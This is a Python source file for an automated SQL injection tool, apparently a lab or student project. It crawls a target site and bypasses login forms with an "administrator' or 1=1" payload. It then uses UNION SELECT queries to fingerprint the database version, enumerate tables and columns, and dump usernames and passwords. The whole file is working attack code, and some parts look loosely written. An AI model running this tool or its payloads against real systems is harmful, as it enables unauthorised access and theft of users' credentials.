import requests
from bs4 import BeautifulSoup
import scanner
import urllib.parse as urlparse
import re
import urllib.parse

class SqlInjection:
    def __init__(self):
        self.users_table = ""
        self.username_column = ""
        self.password_column = ""
        self.url1 = ""
        self.url2 = ""
        self.no_column = ""
        self.string_field = []
        self.comment = ""
        self.db_version=""
        self.database_name=""
        self.output=[]

    # Extract forms from the url
    def extract_forms(self,url,vuln_scan):
        response = vuln_scan.session.get(url)
        parsed_html = BeautifulSoup(response.content, "lxml")
        return parsed_html.find("form")
    # To scan and exploit sql injection
    def sql_in_whereclause(self,vuln_scan):
        for link in vuln_scan.target_links :
            if "=" in link :
                link1 = link.split("=")[0]
                url_join = urlparse.urljoin(link1,"='")
                r=requests.get(url_join)
                if r.status_code != 200 :
                    print("**************************************************************************")
                    print("Sql injection discover in:",link)
                    self.output.append("Sql injection discover in: " + link)
                    if not self.database_name or not self.db_version:
                        try:
                           self.column_number(link)
                           self.administrator_password(link)
                        except:
                            print("Not Found")
                            self.output.append("Not Found")

    # To scan and exploit sql injection in login page
    def sql_in_login(self,link,vuln_scan):

            form = self.extract_forms(link,vuln_scan)
            action = form.get("action")
            post_url = urlparse.urljoin(link, action) if action !='/' else link
            # checking password field
            post_data1 = {}
            inputs_list1 = form.find_all("input")
            for input in inputs_list1:
                input_name = input.get("name")
                input_type = input.get("type")
                input_value = input.get("value")
                if input_type == "username" or input_type == "text":
                    input_value = "administrator"
                elif input_type == "password":
                    input_value = "'"
                post_data1[input_name] = input_value

            post1 = vuln_scan.session.post(post_url, data=post_data1)


            if "Internal Server Error" in post1.text :
                    print("Sql injection in login page is discovered in: " + post_url + " in password field")
            else :
                print("Sql injection in login page is not discovered in password field")
            # checking username field
            inputs_list = form.find_all("input")
            post_data = {}
            payload =""
            for comment in ['--','#']:
                for input in inputs_list:
                    input_name = input.get("name")
                    input_type = input.get("type")
                    input_value = input.get("value")
                    if input_type == "username" or input_type == "text":
                        input_value = "administrator' or 1=1 " + comment
                        payload = input_value
                    elif input_type == "password" :
                        input_value = "1234asdf"
                    post_data[input_name] = input_value
                post = vuln_scan.session.post(post_url, data=post_data)
                if "Log" in post.text :
                    print("Sql injection in login page is discovered in:"+post_url+" in username field")
                    print("You are logged in.....")
                    print("Payload used : ",payload )
                    print(post.content)
                elif"Internal Server Error" in post.text:
                    print("Sql injection in login page is discovered in:" + post_url + " in username field")
                else :
                    print("Sql injection in login page is not discovered in username field")

    # To find number of columns returned by the query
    def column_number(self,url) :
        num = 0
        r = requests.get(url)
        while(r.status_code == 200 or r1.status_code == 200):
            num += 1
            r=requests.get(url+urllib.parse.quote("'ORDER BY "+str(num)+"--"))
            r1=requests.get(url+urllib.parse.quote("'ORDER BY "+str(num)+"#"))
        print("The number of columns returned by the query :"+  str(num-1))
        self.output.append("The number of columns returned by the query :"+  str(num-1))
        self.no_column = num-1
        self.find_string_field(url,num-1)

    # To find String field in column number
    def find_string_field(self,url,num_colum):

        comment_list = ["--","#"]
        db = " "
        for i in range(1,num_colum+1,1):
            string = "'ajantha'"
            payload = ['null'] * num_colum
            payload[i-1] = string
            for list in comment_list :
                 r= requests.get(url + urllib.parse.quote("' union select " + ','.join(payload) + list))
                 if r.status_code == 200 :
                      self.comment = list
                      url1 = url + urllib.parse.quote("' union select " + ','.join(payload) + list)
                      r1 = requests.get(url1)
                      if string.strip('\'') in r1.text:
                          self.string_field.append(str(i))
                          db = url1
                 else :
                     self.comment = "--" #for oracle db
            url2 = url + urllib.parse.quote("' union select " +','.join(payload) +" from dual" + "--")
            repl_url = url2.replace("%27ajantha%27", "banner")
            repl_url = repl_url.replace("dual", "v$version")

            r2 = requests.get(url2)
            r4 = requests.get(repl_url)

            if string.strip('\'') in r2.text :
                self.string_field.append(str(i))

        print("String field in column number :" + ",".join(self.string_field))
        self.output.append("String field in column number :" + ",".join(self.string_field))
        if db == url1 :
           self.db_version = self.database_version(db)
           print("Database version :" + self.db_version)
           self.output.append("Database version :" + self.db_version)
        elif r2.status_code == 200 :
            self.database_name="Oracle"
            print("Database Name : Oracle")
            self.output.append("Database Name : Oracle")
            if "Oracle Database" in r4.text :

                print("Database version :" + re.findall('Oracle\sDatabase.*', r4.text)[0])
                self.output.append("Database version :" + re.findall('Oracle\sDatabase.*', r4.text)[0])
            else :
                print("Database version :Not Found")
                self.output.append("Database version :Not Found")
            self.table_names(repl_url)
    # To find Database Version
    def database_version(self,url):
        database_list = ["@@version","version()"]
        for list in database_list:
            version_url = url.replace("%27ajantha%27",list)
            r = requests.get(version_url)
            soup = BeautifulSoup(r.text, 'html.parser')
            if r.status_code == 200 :
                if list == "@@version" :
                   print("Database Name : Microsoft,Mysql")
                   self.output.append("Database Name : Microsoft,Mysql")
                   self.database_name="Microsoft,Mysql"
                   self.table_names(version_url)
                   return (soup.find(text=re.compile('.*\d{1,2}.\d{1,2}.\d{1,2}.*')))

                elif list =="version()" :
                   print("Database Name : PostgreSql")
                   self.output.append("Database Name : PostgreSql")
                   self.database_name="PostgreSql"
                   self.table_names(version_url)
                   return (soup.find(text=re.compile('.*\d{1,2}.\d{1,2}.\d{1,2}.*')))
    # To find Table name
    def table_names(self,url):

        if "@@version" in url :
            url = url.replace("@@version","table_name")
        elif "version()" in url :
            url = url.replace("version()", "table_name")
        elif "v$version" in url :
            url = url.replace("v$version", "all_tables")
            url = url.replace("banner","table_name")
        table = urllib.parse.quote(" FROM information_schema.tables"+self.comment)
        if "from" not in url :
            url = url.replace(self.comment,table)
        r = requests.get(url)
        soup = BeautifulSoup(r.text,'html.parser')
        if "users" in r.text :
            self.users_table = soup.find(text=re.compile('.*users.*'))
        elif "USERS" in r.text :
            self.users_table = soup.find(text=re.compile('^USERS\_.*'))
        else :
            self.users_table = "Not Found"
        print("Users table name : " + self.users_table)
        self.output.append("Users table name : " + self.users_table)
        self.column_name(url,self.users_table)

    # To find column names
    def column_name(self,url,users_table):
        url = url.replace("table_name","column_name")
        url = url.replace("tables","columns")
        table = urllib.parse.quote(" WHERE table_name = '"+users_table+"'"+self.comment)
        if "all_columns" in url :
            url = url.replace("all_columns","all_tab_columns")
        url = url.replace(self.comment,table)
        r = requests.get(url)
        soup = BeautifulSoup(r.text, 'html.parser')
        if "username" in r.text and "password" in r.text:
          self.username_column = soup.find(text=re.compile('.*username.*'))
          self.password_column = soup.find(text=re.compile('.*password.*'))
        elif "USERNAME" in r.text and "PASSWORD" in r.text :
            self.username_column = soup.find(text=re.compile('.*USERNAME.*'))
            self.password_column = soup.find(text=re.compile('.*PASSWORD.*'))
        else :
            self.username_column = "Not Found"
            self.password_column = "Not Found"
        print("username_column : "+self.username_column)
        print("password_column : "+self.password_column)
        self.output.append("username_column : "+self.username_column)
        self.output.append("password_column : "+self.password_column)
    # To find usernames and passwords
    def administrator_password(self,url):
        payload = ['null'] * self.no_column
        payload[self.no_column-2] = self.username_column
        payload[self.no_column- 1] = self.password_column
        new_url = (url + urllib.parse.quote("' union select " + ','.join(payload)))
        new_url = new_url + urllib.parse.quote(" from "+self.users_table+self.comment)
        r = requests.get(new_url)
        password = re.findall('(?:<th>)(.*?)</th>',str(r.content))
        password1 = re.findall('(?:<td>)(.*?)</td>',str(r.content))
        print("USERNAME\t\t\tPASSWORD\n###############################################################################")
        self.output.append("USERNAME\t\t\tPASSWORD\n###############################################################################")
        username_list =[];password_list =[]
        for list in password :
            if len(list) < 20 and " " not in list:
                username_list.append(list)

        for list in password1 :
            list=list.strip()
            if " " not in list :
                password_list.append(list)

        if len(username_list)==len(password_list) :
            for i in range(0,len(username_list),1)    :
             t=[]
             print(username_list[i],end="")
             t.append(username_list[i])
             print("\t\t\t"+password_list[i]+"\n")
             t.append(password_list[i])
             self.output.append(t)
        else :
            print(username_list)
            print(password_list)
        print("***************************************************************************")
        self.output.append("***************************************************************************")


def main():
    url = input("Enter the url : ")
    vuln_scan = scanner.Scanner(url, [])
    vuln_scan.crawl()
    sql_obj = SqlInjection()
    login = input("Do you want to check sql injection in login page :(yes/no)")
    if login == "yes" :
        print("The Url of login page might be :")
        for link in vuln_scan.target_links:
                login_list = ["login","account","Login"]
                for list in login_list:
                    if list in link :
                        print(link)
        login_url = input("Enter the url of login page :")
        sql_obj.sql_in_login(login_url,vuln_scan)
    sql_obj.sql_in_whereclause(vuln_scan)
if __name__ == '__main__':
    main()
